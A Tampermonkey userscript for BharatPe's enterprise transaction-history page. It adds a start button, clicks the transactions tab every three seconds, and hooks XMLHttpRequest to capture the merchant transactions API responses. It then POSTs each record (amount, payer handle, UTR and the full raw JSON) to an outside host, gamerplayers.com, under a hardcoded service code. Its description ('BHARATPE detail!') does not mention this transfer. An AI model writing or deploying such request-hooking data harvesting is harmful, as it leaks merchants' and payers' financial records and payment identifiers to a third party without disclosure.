// ==UserScript==
// @name         BHARATPE
// @namespace    http://tampermonkey.net/
// @version      2025-03-18
// @description  BHARATPE detail!
// @author       You
// @match        https://enterprise.bharatpe.in/transactionhistory
// @icon         https://www.google.com/s2/favicons?sz=64&domain=bharatpe.in
// @grant        GM_xmlhttpRequest
// @grant        GM_addElement
// @grant        GM_setValue
// @grant        GM_getValue
// @run-at document-idle
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/530199/BHARATPE.user.js
// @updateURL https://update.greasyfork.org/scripts/530199/BHARATPE.meta.js
// ==/UserScript==

(function() {
    'use strict';

	GM_addElement(document.getElementById('search_utr_container_side'), 'input', {
        id: 'cc_ww_code',type:"text"
    });
    GM_addElement(document.getElementById('search_utr_container_side'), 'input', {
        id: 'cc_ww_btn',type:"button",class:"styled",value:"start"
    });
    var startFlag = false;
	var intervalID = null;
	var channelName = null;
    var button = document.getElementById('cc_ww_btn');
    var channelInput = document.getElementById('cc_ww_code');
    if(channelInput){
        var channelNameVal = GM_getValue("cc_ww_code_value","");
        if(""!=channelNameVal){
            channelInput.value = channelNameVal;
        }
    }
    button.onclick = function() {
        var _channelName = document.getElementById('cc_ww_code').value.trim()
        var ccBtn = document.getElementById('cc_ww_btn')
        if(''==_channelName){
         alert('请先输入渠道名称！');
        }else{
			channelName = _channelName;
            if("Close"==ccBtn.value){
                ccBtn.value="Start";
                ccBtn.setAttribute('style', 'background-color: green;');
				startFlag = false;
				if(intervalID!=null){
					clearInterval(intervalID)
				}
            }else{
                GM_setValue("cc_ww_code_value",channelName);
                ccBtn.value="Close";
                ccBtn.setAttribute('style', 'background-color: red;');
				startFlag = true;
				doStart();
            }
        }
    }

    const originOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (_, url) {
        if (url.startsWith("https://payments-tesseract.bharatpe.in/api/v1/merchant/transactions")) {
            this.addEventListener("readystatechange", function () {
                if (this.readyState === 4) {
                    const res = JSON.parse(this.responseText);
					if(res && res.data && res.data.transactions && res.data.transactions.length>0){
						console.log('1->',res.data.transactions.length);
						commitData(res.data.transactions)
					}else{
						console.log('2->',res);
					}
                   
                }
            });
        }
        originOpen.apply(this, arguments);
    };


	function doStart(){
		if(!startFlag){
			return;
		}
		intervalID = setInterval(function(){
			document.querySelector("#transaction_tab").click();
		}, 3000);
	}

	function commitData(dataArray){
		var channelNameVal = GM_getValue("cc_ww_code_value","");
        if(""==channelName && ""!=channelNameVal){
            channelName = channelNameVal;
            channelInput.value = channelNameVal;
        }
		if(""==channelName){
			console.log('channelName is not config!!!');
			return;
		}

		var dataList = [];
		for (var i = 0; i < dataArray.length; i++) {
			var item = {};
			var record = dataArray[i];
			item['amount'] = record['amount'];
			item['bankType'] = record['payerHandle'];
			item['utrNo'] = record['bankReferenceNo'];
			item['remark'] = JSON.stringify(record);
			dataList.push(item);
		}
		console.log('dd',dataList);
		GM_xmlhttpRequest({
			method: "POST",
			url: "https://gamerplayers.com/gold-pay/portal/crawl/batchBankUtr",
			headers: {
			"Content-Type": "application/json",
			"X-SERVICE-CODE": "64842531e4b0ac0d6892d31b",
			"X-CHANNEL-NAME": channelNameVal
			},
			data: JSON.stringify(dataList),
			onload: function(response) {
				console.log(response.responseText);
			}
		});
	}

    // Your code here...
})();

